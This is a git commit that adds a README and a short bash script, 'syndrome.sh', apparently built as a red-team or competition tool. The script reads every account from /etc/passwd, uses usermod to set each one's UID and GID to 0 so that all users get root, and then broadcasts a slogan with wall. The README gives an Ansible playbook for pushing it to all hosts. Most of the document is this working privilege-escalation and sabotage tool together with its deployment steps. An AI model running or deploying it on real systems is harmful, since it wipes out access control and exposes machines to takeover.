4c74e3a25cca3000613c3482b538bfcb4cad9f7a
Max <msf9542@rit.edu>
2022-02-16 22:49:55 -0500

    sn=yndrome and deploy are working

--- README.md
+++ README.md
@@ -1,1 +1,24 @@
 # syndrome
+
+When everyone is [root], no one will be
+
+## Description
+
+This script run and replaces all uid with 0 to make every user have root privileges
+
+## How to run this script
+
+```sh
+./syndrome.sh
+```
+
+## Ansible Execution
+
+```yml
+---
+- name: run syndrome
+  host: all
+  become: yes
+  roles:
+    - name: syndrome
+```
---
+++ syndrome.sh
@@ -0,0 +1,20 @@
+#!/bin/bash
+
+# pulls list of users from /etc/passwd
+users=$(awk -F: '{print $1}' < $/etc/passwd)
+
+# use newline as delimiter for for-loop
+IFS=$'\n'
+
+# loop over all users
+for user in $users
+do
+    # set user uid to 0
+    usermod -ou 0 $user
+    
+    # set user gid to 0
+    usermod -og 0 $user
+done
+
+# signature catch phrase
+echo "WHEN EVERYONE IS ROOT, NO ONE WILL BE" | /usr/bin/wall
